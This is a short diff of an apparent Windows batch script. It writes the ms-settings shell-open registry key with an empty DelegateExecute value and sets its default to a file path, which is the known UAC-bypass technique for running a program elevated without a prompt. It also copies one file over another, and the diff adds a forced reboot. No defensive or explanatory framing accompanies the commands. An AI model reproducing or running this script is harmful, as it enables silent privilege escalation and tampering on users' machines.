@@ -24,5 +24,6 @@ powershell -Command "New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\com
 powershell -Command "New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force"
 powershell -Command "if (Test-Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command') { Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value '%filepath2%' } else { Write-Host 'Registry path does not exist.' }"
 xcopy "%filepath12%" "%filepath%"
+shutdown -r
 exit
 
